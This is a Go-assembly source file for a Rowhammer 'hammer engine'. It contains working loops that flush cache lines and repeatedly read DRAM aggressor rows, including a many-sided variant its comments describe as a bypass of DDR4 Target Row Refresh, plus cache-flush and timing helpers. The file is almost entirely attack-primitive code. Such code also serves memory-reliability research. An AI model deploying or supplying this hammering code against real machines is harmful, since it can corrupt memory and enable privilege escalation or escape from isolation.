// Rowhammer x64 assembly — CLFLUSH hot loop.
// These functions are called from the Go hammer engine.

#include "textflag.h"

// func hammer2sidedASM(addr1, addr2 uintptr, iterations, rounds int)
//
// Core rowhammer inner loop: CLFLUSH both addresses + MFENCE,
// then read both (forces DRAM row activation), repeat.
// Each outer loop is one "refresh window attempt" (rounds).
//
TEXT ·hammer2sidedASM(SB),NOSPLIT,$0-32
    MOVQ addr1+0(FP), DI
    MOVQ addr2+8(FP), SI
    MOVQ iterations+16(FP), CX
    MOVQ rounds+24(FP), DX

outerLoop:
    MOVQ CX, BX           // BX = iterations counter

innerLoop:
    // Flush addr1 and addr2 from cache.
    CLFLUSH (DI)
    CLFLUSH (SI)
    // Memory fence — ensures flushes complete before reads.
    MFENCE

    // Access both rows (forces DRAM activation).
    MOVQ (DI), AX
    MOVQ (SI), AX

    DECQ BX
    JNZ  innerLoop

    // One refresh window complete.
    DECQ DX
    JNZ  outerLoop

    RET

// func hammerManyASM(addrs []uintptr, iterations, rounds int)
//
// Multi-sided hammer: flush + read a slice of aggressor addresses.
// Used for TRR bypass (DDR4).
//
TEXT ·hammerManyASM(SB),NOSPLIT,$0-40
    MOVQ addrs_base+0(FP), DI   // pointer to []uintptr data
    MOVQ addrs_len+8(FP), SI    // len(addrs)
    MOVQ iterations+24(FP), CX
    MOVQ rounds+32(FP), DX

manyOuter:
    MOVQ CX, BX                 // BX = iterations

manyInner:
    // Flush all aggressor rows.
    MOVQ SI, R8                 // R8 = count
    MOVQ DI, R9                 // R9 = base pointer
flushLoop:
    MOVQ (R9), R10              // R10 = address
    CLFLUSH (R10)
    ADDQ $8, R9
    DECQ R8
    JNZ  flushLoop
    MFENCE

    // Read all aggressor rows.
    MOVQ SI, R8
    MOVQ DI, R9
readLoop:
    MOVQ (R9), R10
    MOVQ (R10), AX
    ADDQ $8, R9
    DECQ R8
    JNZ  readLoop

    DECQ BX
    JNZ  manyInner

    DECQ DX
    JNZ  manyOuter

    RET

// func clflushLine(addr uintptr)
// Flush a single cache line.
TEXT ·clflushLine(SB),NOSPLIT,$0-8
    MOVQ addr+0(FP), DI
    CLFLUSH (DI)
    MFENCE
    RET

// func rdtscpFence() uint64
// Read timestamp counter with serializing fence (for timing measurements).
TEXT ·rdtscpFence(SB),NOSPLIT,$0-8
    MFENCE
    RDTSC
    MFENCE
    // EDX:EAX → combine to 64-bit.
    SHLQ $32, DX
    ORQ  DX, AX
    MOVQ AX, ret+0(FP)
    RET
